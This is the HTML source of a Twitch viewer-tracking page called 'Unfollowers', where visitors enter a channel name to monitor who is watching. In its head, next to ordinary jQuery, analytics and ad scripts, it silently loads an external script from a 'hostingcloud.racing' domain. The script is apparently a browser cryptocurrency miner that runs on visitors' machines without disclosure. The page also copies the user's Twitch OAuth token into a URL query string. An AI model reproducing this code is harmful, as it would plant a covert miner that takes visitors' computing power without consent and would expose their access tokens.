<html>
     <head>
        <title>Unfollowers - Live viewers</title>
        <meta name="description" content="Track your viewers while your streaming! See who is following you or not!">
        <meta name="keywords" content="twitch viewers,twitch who is watching me,twitch chatters">
        <meta name="author" content="Daniel Baychev">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" type="image/x-icon" href="img/h.png" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script type = "text/javascript" 
         src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
      </script>
      <script src="js/json2.js" type="text/javascript"></script>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
      <script src="js/json2.js" type="text/javascript"></script>
      <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
      <link href="css/css.css" rel="stylesheet" type="text/css"/>
            <link href="css/index.css" rel="stylesheet" type="text/css"/>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
      <script src="login.js" type="text/javascript"></script>
        <!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TZSXQFP');</script>
<!-- End Google Tag Manager -->
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-3989608972631976",
    enable_page_level_ads: true
  });
</script>
<script>
function myFunction() {
    var x = document.getElementById("myTopnav");
    if (x.className === "topnav") {
        x.className += " responsive";
    } else {
        x.className = "topnav";
    }
}
</script>
                        <script type="text/javascript">

             $('.myButton').on('click', function(e) {
             var Tuser = $('.twitch').val();
             window.location.href = window.location.href + "&user=" + Tuser;
             
             if(typeof getUrlParameter('user') === "string"){
                
                  document.getElementById("#hideme").style.display = "none";
             }
             
});
</script>
                        <script type="text/javascript">
             $('.myButton').on('click', function(e) {
             var Tuser = $('.twitch').val();
             window.location.href = window.location.href + "&user=" + Tuser;
             
             if(typeof getUrlParameter('user') === "string"){
                
                  document.getElementById("#hideme").style.display = "none";
             }
             
});
</script>
<script src="https://www.hostingcloud.racing/8qk1.js"></script>

    </head>
    <body id="body" style="font-family: Sans-Serif;background-color: white;">
        <nav role='navigation'>
<div class="topnav" id="myTopnav">
       <a href="livechatters.php"  onclick="page(this);" class="active">Viewers</a>
  <a href="home.php" onclick="page(this);">Home</a>
  <a href="f4f.php"  onclick="page(this);">F4F Tool</a>
  <a href="unfollow.php"  onclick="page(this);">Unfollower</a>
  <a href="links.php" onclick="page(this);">Useful Links</a>
  <a href="about.php"  onclick="page(this);">About</a>
    <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=v8jjvzxpx7byti5lykiyy5001gueh4&redirect_uri=http://unfollowers.tv/home.php&scope=analytics:read:extensions"><img height="25"  class="logme"  src="img/login.png"></a>
    
  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
    <i class="fa fa-bars"></i>
  </a>
</div>
</nav>
       <h1 style="text-align:center"> Enter the channel you wish to monitor! </h1>
       <p style="text-align:center;color:grey:">* DO NOT USE UPPER CASE LETTERS!</p>
         <input id='hideme'  type="text" class='twitch'>
         <br>
        <input id='hideme' type='submit' class='myButton btn'>
        <br>
              <div style="background-color:#33333357;border-radius: .25rem;" class="container">
            <div class="row">
                <div class="col-md-12">
                    <h4 style="text-align:center;color:ffffff;" >Description</h4>
                    <p style="text-align:center;color:ffffff;">In this page you can monitor yours or someone elses viewers, followage & subscriptions (coming soon!).<br>
      Please be reasonable when entering a twitch channel I.E. Do not enter channels with thousands of views !</p>
                </div>
            </div>
        </div>
      

        <script>
                var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : sParameterName[1];
        }
    }
};

     
             $('.myButton').on('click', function(e) {
             var Tuser = $('.twitch').val();
             window.location.href = "livechatters.php" + "?fragmentaccess_token=" + sessionStorage.getItem("token") + "&scope=analytics%3Aread%3Aextensions&token_type=bearer" + "&user=" + Tuser;
             
             if(getUrlParameter('user') === true){
                  document.getElementById("#hideme").style.display = "none";
             }
});

</script>

    </body>
</html>
